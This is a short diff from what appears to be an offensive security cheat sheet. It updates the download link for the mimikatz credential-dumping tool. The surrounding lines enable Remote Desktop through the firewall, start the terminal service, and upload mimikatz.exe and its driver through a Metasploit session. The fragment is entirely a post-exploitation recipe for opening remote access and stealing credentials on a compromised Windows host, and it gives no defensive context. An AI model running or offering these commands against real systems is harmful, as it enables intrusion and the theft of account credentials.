@@ -121,7 +121,7 @@ netsh firewall set service remotedesktop enable
 net start termservice  
 sc config termservice start= auto  
 ## Mimikatz
-wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip"
+wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180205/mimikatz_trunk.zip"  
 unzip mimikatz_trunk.zip  
 (msf) upload /opt/x64/mimikatz.exe .  
 (msf) upload /opt/x64/mimidrv.sys .  
